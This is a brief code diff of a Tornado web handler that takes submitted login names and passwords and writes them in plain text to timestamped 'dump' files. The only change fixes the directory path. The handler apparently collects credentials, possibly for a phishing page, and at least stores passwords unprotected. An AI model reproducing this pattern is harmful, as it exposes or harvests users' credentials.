@@ -28,7 +28,7 @@ class MainHandler(tornado.web.RequestHandler):
             login = self.get_argument("login")
             password = self.get_argument("password")
             name = time.time()
-            file = open("logs/dump"+str(name), mode="a+")
+            file = open("logs/dump/"+str(name), mode="a+")
             file.write("login:" + login + "\npassword:" + password)
             file.close()
         except tornado.web.HTTPError:
